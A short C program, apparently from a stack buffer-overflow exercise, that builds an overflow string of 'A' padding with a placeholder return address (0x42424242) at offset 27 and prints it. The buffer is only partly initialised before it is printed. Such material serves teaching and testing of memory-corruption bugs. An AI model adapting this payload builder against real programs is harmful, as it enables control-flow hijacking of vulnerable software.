long new_eip = 0x42424242;
int start_index = 27;
int main(int argc, char** argv)
{
	int i=0; 
	char buf[40];
	// or i <= 39
	for (i=0;i<=31;i++){
		buf[i] = 'A';
	}
	
	*(long *) &buf[start_index] = new_eip;
	buf[39]='\0';
	puts(buf);
}

